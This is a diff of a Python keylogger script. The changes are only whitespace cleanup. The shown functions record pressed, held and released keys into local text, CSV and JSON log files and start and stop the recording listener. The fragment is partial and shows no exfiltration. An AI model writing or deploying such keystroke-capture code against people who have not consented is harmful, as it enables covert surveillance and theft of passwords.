@@ -20,18 +20,17 @@ def timestamp():
     return time.strftime('%Y-%m-%d %H:%M:%S')
 
 def text(key):
-
     with open(os.path.join("log", "log.txt"), 'a+') as file:
         file.write(f"Timestamp: {Time}, Language: {lang}\n")
         file.write(key)
         file.write("\n\n")
 
 def csv_log(key_list):
-
     with open(os.path.join("log", "log.csv"), "a+", newline="") as csv_file:
         csv_writer = csv.writer(csv_file)
         for item in key_list:
             csv_writer.writerow([item])
+         
 
 def update_json(key_list):
     with open(os.path.join("log", "logs.json"), 'w') as log:
@@ -42,28 +41,23 @@ def text_logs():
     text(str(keys))
 
 def press(key):
-
     global x, key_list, keys
     if x == False:
         key_list.append({'Pressed': f'{key}'})
         x = True
     if x == True:
         key_list.append({'Held': f'{key}'})
-
     update_json(key_list)
 
 def release(key):
-
     global x, key_list, keys
     key_list.append({'Released': f'{key}'})
     if x == True:
         x = False
     update_json(key_list)
-
     keys = keys + str(key)
 
 def start_log():
-
     global x, key_list, listen, Time, lang
     create()
     x = False
@@ -77,17 +71,14 @@ def start_log():
     print("[!] Recording Keylogs")
 
 def stop_log():
-
     global x, listen
     x = False
     thread = Thread(target=listen.stop)
     thread.daemon = True
     thread.start()
-
     print("[+] Keylogging stopped.")
 
 def delete():
-
     try:
         Dir = "log"
         files = os.listdir(Dir)
